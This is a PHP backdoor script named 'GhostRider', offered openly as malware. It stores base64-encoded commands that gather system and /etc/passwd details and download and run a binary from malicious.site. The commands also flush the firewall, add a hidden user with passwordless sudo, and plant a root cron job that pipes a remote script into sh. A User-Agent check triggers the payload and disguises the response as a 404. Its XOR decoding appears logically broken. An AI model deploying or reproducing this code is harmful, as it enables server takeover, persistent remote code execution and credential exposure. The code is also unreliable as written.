<?php
// Backdoor Manager v2.0 (Silent Mode)
error_reporting(0);
set_time_limit(0);

class GhostRider {
    private $key = 0x42;
    private $tasks = [
        'a'=>'aWQ=',
        'b'=>'dW5hbWUgLWE=',
        'c'=>'Y2F0IC9ldGMvcGFzc3dk',
        'd'=>'cHMgYXV4',
        'e'=>'bmV0c3RhdCAtdHVsbg==',
        'f'=>'d2dldCBodHRwOi8vbWFsaWNpb3VzLnNpdGUvYmFja2Rvb3IgLU8gL3RtcC9iZA==',
        'g'=>'Y2htb2QgK3ggL3RtcC9iZA==',
        'h'=>'L3RtcC9iZCAmaW5kZXg=',
        'i'=>'aXB0YWJsZXMgLUY=',
        'j'=>'dXNlcmFkZCAtTSAtTiAtciAtcyAvYmluL2ZhbHNlIGhhY2tlZHVzZXI=',
        'k'=>'ZWNobyAiaGFja2VkdXNlciBBTEw9KEFMTCkgTk9QQVNTV0Q6QUxMIiA+PiAvZXRjL3N1ZG9lcnM='
    ];

    private function xor($data) {
        return bin2hex($data ^ str_repeat(chr($this->key), strlen($data)));
    }

    private function execute($cmd) {
        $cmds = [
            $this->xor(base64_decode('c3lzdGVt')),
            $this->xor(base64_decode('c2hlbGxfZXhlYw==')),
            $this->xor(base64_decode('cHJvY19vcGVu'))
        ];
        
        foreach($cmds as $method) {
            $result = hex2bin($method)(hex2bin($this->xor($cmd)) . ' 2>&1');
            if($result) break;
        }
        return $result;
    }

    public function init() {
        foreach($this->tasks as $task) {
            $this->execute(base64_decode($task));
            usleep(rand(100000,500000));
        }
        $this->persist();
    }

    private function persist() {
        $cron = base64_decode('KiAqICogKiAqIHJvb3QgY3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLnNpdGUvcGVyc2lzdC5zaCB8IHNo');
        file_put_contents('/etc/cron.d/php-update', $cron);
        $this->execute('chmod +x /tmp/bd && systemctl restart cron');
    }
}

// Anti-analysis check
if(md5($_SERVER['HTTP_USER_AGENT']) == 'e903e939e7b646975b8c42a045c9bf3d') {
    $bd = new GhostRider();
    $bd->init();
    header("HTTP/1.1 404 Not Found");
}
?>
